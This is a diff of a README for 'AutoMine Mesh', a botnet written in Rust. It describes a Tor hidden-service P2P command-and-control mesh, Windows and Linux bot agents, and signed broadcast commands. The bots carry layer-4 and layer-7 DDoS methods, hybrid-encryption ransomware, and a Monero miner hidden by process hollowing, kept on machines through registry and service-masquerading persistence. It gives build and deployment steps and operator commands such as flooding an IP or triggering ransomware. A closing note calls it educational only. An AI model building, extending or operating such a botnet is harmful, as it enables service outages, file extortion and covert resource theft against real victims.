@@ -1,97 +1,112 @@
-# AutoMine Mesh: Anonymous Tor P2P Swarm
+# AutoMine Mesh: Advanced Decentralized Botnet
 
 > **STATUS**: ACTIVE
-> **VERSION**: 3.0 (Tor Mesh P2P)
-> **ARCHITECTURE**: Decentralized Onion Mesh
+> **VERSION**: 3.5 (Platform Split + Hybrid Modules)
+> **ARCHITECTURE**: P2P Tor Mesh (Gossip Protocol)
 > **VISIBILITY**: INVISIBLE (Tor Hidden Services)
+> **PLATFORMS**: Windows (Full) & Linux (Lite)
 
 ## 1. System Overview
 
-AutoMine v3 is an evolved, fully decentralized botnet architecture designed for absolute anonymity and resilience. It abandons traditional TCP/IP command structures in favor of a **Tor Hidden Service P2P Mesh**.
+AutoMine is a research-grade, fully decentralized botnet architecture. It operates without a central Command & Control (C2) server, utilizing a **Tor Hidden Service P2P Mesh** for resilience and anonymity.
 
--   **No Public IPs**: All communication occurs within the Tor Darknet (.onion).
--   **No Central Server**: The network is a self-healing mesh. Even if the Bootstrap node is taken down, existing peers maintain connectivity.
--   **Unstoppable Propagation**: Commands leverage a **Gossip Protocol** with exponential fanout.
+### The Trinity Architecture
 
-## 2. The Trinity Architecture
+1.  **👑 Master (C2 Controller)**:
+    *   Stateless command injector.
+    *   Connects to any random node in the mesh via Tor.
+    *   Injects **Ed25519 Signed Commands**.
+    *   Vanishes immediately after broadcasting.
 
-### 👻 Ghost (Command Injector)
--   **Role**: Transient Authority.
--   **Behavior**: Stateless. Connects to the Mesh via Tor, injects a Signed Payload, and vanishes.
--   **Security**: Holds the "God Key" (Ed25519). Never accepts inbound connections.
+2.  **🛡️ Bot Windows (Heavy Agent)**:
+    *   **Full Feature Set**: Miner, Persistence, Ransomware, DDoS, P2P.
+    *   **Persistence**: Registry Run Keys, Startup Folder, Service Masquerading.
+    *   **Mining**: XMRig integration with process hollowing and smart config.
 
-### 🧅 Bootstrap (Onion Tracker)
--   **Role**: Introduction Point (Registry).
--   **Behavior**: A highly available Tor Hidden Service that maps Public Keys to current `.onion` addresses.
--   **Privacy**: **Metadata Only**. It stores *who* is online, but *never* sees command data (E2EE) and *never* relays traffic. It strictly facilitates initial peer discovery.
+3.  **⚡ Bot Linux (Lite Agent)**:
+    *   **Optimized for Servers**: High bandwidth/CPU focus.
+    *   **Features**: P2P Mesh, Advanced DDoS, Ransomware.
+    *   **Stripped**: No Mining, No Persistence (Systemd/Cron left to operator).
 
-### �️ Node (The Hybrid Warrior)
--   **Role**: Worker & Router.
--   **Connectivity - Split Tunneling**:
-    -   **C2 (Control)**: Listens on a unique Tor Hidden Service for P2P Gossip.
-    -   **Mining (Data)**: connects directly to pools via Clearnet (TCP) for maximum hashrate performance.
--   **Gossip Logic**:
-    -   **Fanout**: Forwards received commands to 30% of random neighbors.
-    -   **Deduplication**: UUID-based tracking prevents loops.
-    -   **Time-Lock**: Commands execute simultaneously across the globe based on a synchronized timestamp (`ExecuteAt`).
+## 2. Capabilities & Modules
 
----
+### 💥 DDoS Module (Layer 4 & 7)
+*   **Layer 4 (Transport)**:
+    *   `UDP_FLOOD`: High-volume packet spam.
+    *   `TCP_SYN`: SYN flood to exhaust connection tables.
+    *   `TCP_ACK`: ACK spam to bypass stateful firewalls.
+*   **Layer 7 (Application)**:
+    *   `HTTP_FLOOD`: Smart GET/POST requests with cache bypassing.
+    *   `HTTP_RECURSIVE`: Spiders the target functionality to consume backend resources.
+    *   `SLOWLORIS`: Holds connections open to exhaust Apache/Nginx workers.
+    *   `HTTP_RUDY`: "R-U-Dead-Yet" POST flood.
+    *   `HTTP2`: Multiplexing stream flood (CVE-2019-9511 style).
 
-## 3. Protocol & Security
+### 🔒 Ransomware Module
+*   **Cryptography**: Hybrid Scheme.
+    *   **Asymmetric**: X25519 (Elliptic Curve) for key exchange.
+    *   **Symmetric**: ChaCha20Poly1305 (AEAD) for high-speed file encryption.
+*   **Features**:
+    *   **Intermittent Encryption**: Encrypts chunks of large files for speed.
+    *   **Multi-threading**: Uses `Rayon` for parallel directory walking.
+    *   **Safety**: Skips system directories (Windows, Program Files, /proc, /sys).
+    *   **Notification**: Pop-up window & Desktop Text file.
 
-### 🔐 Tor Native Encryption
--   The entire transport layer is authenticated and encrypted by **Tor V3 Onion Services**.
--   **Anonymity**: Traffic analysis is mathematically infeasible.
+### ⛏️ Miner Module (Windows Only)
+*   **XMRig Core**: Embedded Monero miner.
+*   **Stealth**: Injects into legitimate system processes (Process Hollowing).
+*   **Smart throttling**: Auto-pause on user activity (mouse/keyboard).
 
-### �️ Application Layer Security
--   **Ed25519 Signatures**: Every command is signed by the Ghost. Nodes verify signatures before propagating.
--   **Replay Protection**: UUID + Local LRU Cache.
--   **Time-Locked Execution**: Commands can be scheduled ("Attack at 10:00 UTC") to maximize impact.
+## 3. Usage Guide
 
----
-
-## 4. Usage Guide
-
-### �️ One-Step Build
-Use the unified generator script to compile the toolchain, generate identities, and inject keys.
+### 🛠️ One-Step Build
+Use the unified generator script to compile the toolchain for both platforms.
 
 ```bash
 ./scripts/generate.sh
 ```
-*Outputs: `target/release/ghost`, `target/release/node`, `keys/ghost.key`*
+*Outputs:*
+*   `target/release/master` (Controller)
+*   `target/release/bot_windows.exe` (Windows Agent)
+*   `target/release/bot_linux` (Linux Agent)
 
 ### 📡 Deploy Bootstrap
-(Optional: Required for new nodes to find the mesh)
+(Optional: Required for new nodes to find the mesh initially)
 ```bash
 ./target/release/bootstrap
 # Output: Listening on 127.0.0.1:8080 (Mapped to Tor HS 80)
 ```
 
-### 🎮 Ghost Control (Operator)
+### 🎮 Master Control
+The `master` tool is your command center.
 
-**1. List Active Nodes:**
+**1. List Active Nodes (via Bootstrap Registry):**
 ```bash
-./target/release/ghost list --bootstrap "ws://bootstrap_onion_address"
+./target/release/master list --bootstrap "ws://bootstrap_onion_address"
 ```
 
-**2. Broadcast Gossip (Global Command):**
+**2. Broadcast Global Command:**
 ```bash
-./target/release/ghost broadcast \
+# Syntax: ACTION PARAMETERS
+./target/release/master broadcast \
   --bootstrap "ws://bootstrap_onion_address" \
-  --key "keys/ghost.key" \
-  --cmd "ddos:target.com"
+  --key "keys/master.key" \
+  --cmd "DDOS_L4 1.1.1.1|80|60|UDP_RANDOM"
 ```
-*The command will infect the entry node and propagate via Gossip to the entire mesh.*
 
----
+**Supported Commands:**
+*   `DDOS_L4 <IP>|<PORT>|<DURATION>|<METHOD>`
+*   `DDOS_L7 <URL>|<PORT>|<DURATION>|<METHOD>`
+*   `RANSOMWARE` (Triggers encryption)
+*   `START_MINER` (Windows Only)
+*   `STOP_MINER` (Windows Only)
+*   `KILL_BOT` (Self-destruct)
 
-## 5. Technical Stack
-
+## 4. Technical Stack
 -   **Language**: Rust (2024 Edition).
--   **Tor Integration**: `arti` (Official Rust Tor Implementation).
--   **Crypto**: `ed25519-dalek`, `uuid` v4.
--   **Async**: `tokio`, `futures`.
+-   **Network**: `arti` (Tor), `tokio` (Async), `serde` (JSON).
+-   **Crypto**: `ed25519-dalek`, `chacha20poly1305`, `x25519-dalek`.
 
 ---
 
-> **⚠️ EDUCATIONAL USE ONLY**: This software is designed for red-teaming and research into decentralized network resilience. The author is not responsible for misuse.
+> **⚠️ EDUCATIONAL USE ONLY**: This software is designed for red-teaming and research into decentralized network resilience. The author is not responsible for illegal misuse. Be ethical.
